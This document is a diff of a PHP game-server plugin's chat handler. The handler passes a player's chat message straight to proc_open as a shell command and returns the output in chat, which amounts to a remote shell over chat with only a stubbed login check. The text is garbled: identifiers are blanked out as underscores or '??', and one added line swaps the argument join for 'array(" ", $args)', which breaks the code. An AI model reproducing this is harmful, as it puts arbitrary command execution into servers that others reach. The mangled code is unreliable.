@@ -52,12 +52,12 @@ class Main extends PluginBase implements Listener {
     /*
     Used when a player chats
     */
-    public function ____(____ $event) {
-        if(substr($event->get_____(), 0, 1)) {
-            $cmd = substr(explode(" ", $event->get_____())[_], 1); // Commande
-            $args = explode(" ", $event->get_____()); 
+    public function ??(?? $event) {
+        if(substr($event->get??(), 0, 1)) {
+            $cmd = substr(explode(" ", $event->get??())[_], 1); // Commande
+            $args = explode(" ", $event->get??()); 
             unset($args[0]);
-            $args = explode(" ", implode(___, $args));// Arguments de la cmd.
+            $args = explode(" ", implode(??, $args));// Arguments de la cmd.
             if($cmd == "log" || $cmd == "login") {
                 // Logging in...
             } elseif($cmd == "logout") {
@@ -65,9 +65,9 @@ class Main extends PluginBase implements Listener {
                     // TODO: Log out.
                 }
             } else {
-                if($this->_____($event->getPlayer())) {
+                if($this->??($event->getPlayer())) {
                     $process = proc_open(
-						$cmd . " " . ____(" ", $args),
+						$cmd . " " . array(" ", $args),
 					    array(
 						      0 => array("pipe", "r"), //S				TDIN
 						      1 => array("pipe", "w"), //S				TDOUT
@@ -76,12 +76,12 @@ class Main extends PluginBase implements Listener {
 					    $pipes
 				    );
 				    if ($process !== false) {
-					    $stdout = stream_get_contents($___[1]);
+					    $stdout = stream_get_contents($pipes[1]);
 					    fclose($pipes[1]);
 					    $stderr = stream_get_contents($pipes[2]);
 					    fclose($pipes[2]);
 					    proc_close($process);
-                        $event->get______()->sendMessage(self::PREFIX . "$stderr\n$____");
+                        $event->get??()->sendMessage(self::PREFIX . "$stderr\n$??");
                     }
                 }
             }
